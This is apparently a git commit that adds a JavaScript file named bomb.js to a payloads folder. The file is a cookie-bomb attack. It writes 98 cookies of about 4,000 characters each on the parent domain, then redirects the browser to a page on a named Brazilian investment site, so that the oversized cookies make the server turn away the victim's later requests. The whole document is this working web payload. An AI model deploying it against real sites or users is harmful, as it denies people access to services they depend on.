78b2c195d433d0b8026120fd357969f446525391
GouveaHeitor <hi@heitorgouvea.me>
2020-05-24 16:49:12 -0300

    Update and rename test.js to bomb.js

---
+++ public/payloads/bomb.js
@@ -0,0 +1,8 @@
+var base_domain = document.domain.substr(document.domain.indexOf('.'));
+var pollution   = Array(4000).join('a');
+
+for (var i = 1; i < 99; i++) {
+    document.cookie='bomb' + i + '=' + pollution + ';Domain=' + base_domain + ";path=/";
+}
+
+window.location="https://easynvest.com.br/acompanhar/investimentos";
